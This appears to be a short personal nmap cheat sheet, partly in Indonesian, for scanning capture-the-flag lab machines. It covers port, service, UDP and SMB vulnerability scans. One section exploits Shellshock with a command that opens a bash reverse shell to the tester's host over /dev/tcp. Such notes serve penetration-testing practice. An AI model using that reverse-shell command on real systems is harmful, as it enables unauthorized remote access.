# SCANNING WITH NMAP 

sudo nmap -sC -sV -vv 10.10.10.229 


# Kalo gabisa konek + gaada port open 

    nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts <host>

# Scan SMB vuln

    nmap --script smb-vuln* -p 445 10.10.10.40 

# Scan shellshock vuln

    nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh" 10.10.10.56

PS: `uri=` di temukan pada target machine

# Exploit shellshock vuln

getting reverse shell from shellshock vuln

    nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=/bin/bash -i >& /dev/tcp/10.10.14.20/1337 0>&1" 10.10.10.56

# enum tcp

    nmap -sU --top-ports 200 10.10.10.21  

or 

    nmap -sU --top-ports 200 -oA scans/nmap-udptop200 10.10.10.21  

# scan all port

    nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.160

# scan nmap 

    nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.76

# scan for several ports

    nmap -sV -sC -p 79,111,22022,65258 -oA nmap/scripts 10.10.10.76